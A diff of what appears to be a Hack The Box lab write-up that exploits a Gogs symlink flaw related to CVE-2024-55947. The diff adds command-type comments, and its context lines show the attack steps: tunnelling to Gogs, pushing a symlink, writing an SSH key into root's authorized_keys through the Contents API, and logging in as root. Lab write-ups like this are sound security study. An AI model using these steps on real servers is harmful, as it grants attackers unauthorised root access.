@@ -17,6 +17,7 @@ Related to CVE-2024-55947 (and the subsequent bypass of its fix).
 
 ### 1. SSH tunnel to the bound-localhost Gogs
 
+<!-- cmd: linux -->
 ```bash
 ssh -L 8080:127.0.0.1:3001 ben@TARGET_IP
 ```
@@ -27,12 +28,14 @@ Browse `http://127.0.0.1:8080`, register `123:1234Abcd@`, create repo `pwn`.
 
 ### 3. Generate SSH keypair locally
 
+<!-- cmd: linux -->
 ```bash
 ssh-keygen -t rsa -f /tmp/htb_key -N ""
 ```
 
 ### 4. Clone, add symlink, push
 
+<!-- cmd: linux -->
 ```bash
 git clone http://123:1234Abcd@@127.0.0.1:8080/123/pwn.git
 cd pwn
@@ -48,6 +51,7 @@ git push
 
 ### 6. Write through the symlink via Contents API
 
+<!-- cmd: linux -->
 ```bash
 TOKEN="<API_TOKEN>"
 PUB=$(base64 -w0 /tmp/htb_key.pub)
@@ -62,6 +66,7 @@ Gogs resolves `link` → `/root/.ssh/authorized_keys` → base64-decodes our pub
 
 ### 7. Log in as root
 
+<!-- cmd: linux -->
 ```bash
 ssh -i /tmp/htb_key root@TARGET_IP
 ```
